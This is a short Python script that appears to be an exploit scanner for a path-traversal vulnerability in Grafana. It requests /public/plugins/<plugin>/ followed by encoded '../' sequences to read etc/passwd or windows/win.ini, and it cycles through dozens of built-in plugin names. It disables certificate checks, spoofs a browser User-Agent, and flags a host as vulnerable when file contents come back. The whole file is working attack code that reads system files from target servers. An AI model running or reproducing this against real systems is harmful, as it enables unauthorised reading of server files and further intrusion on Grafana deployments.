import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
payload=['etc/passwd','windows/win.ini']
doclist=['live', 'icon', 'loki', 'text', 'logs', 'news', 'stat', 'mssql', 'mixed', 'mysql', 'tempo', 'graph', 'gauge', 'table', 'debug', 'zipkin', 'jaeger', 'geomap', 'canvas', 'grafana', 'welcome', 'xychart', 'heatmap', 'postgres', 'testdata', 'opentsdb', 'influxdb', 'barchart', 'annolist', 'bargauge', 'graphite', 'dashlist', 'piechart', 'dashboard', 'nodeGraph', 'alertlist', 'histogram', 'table-old', 'pluginlist', 'timeseries', 'cloudwatch', 'prometheus', 'stackdriver', 'alertGroups', 'alertmanager', 'elasticsearch', 'gettingstarted', 'state-timeline', 'status-history', 'grafana-clock-panel', 'grafana-simple-json-datasource', 'grafana-azure-monitor-datasource']
total=[]
for p in payload:
	for d in doclist:
		total.append((p,d))
def scan(url):
	flag=[]
	for t in total:
		p=t[0]
		doc=t[1]
		try:
			if url[-1]=='/':
				url2=url+'public/plugins/'+doc+'/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f'+p
			else:
				url2=url+'/public/plugins/'+doc+'/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f'+p
			headers={
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
			}
			r2=requests.get(url2,headers=headers,verify=False,timeout=8)
			if 'root:' in r2.text or ('fonts' in r2.text and 'extensions' in r2.text):
				flag.append(1)
				break
		except:
			pass
	if len(flag)>0:
		return True
	else:
		return False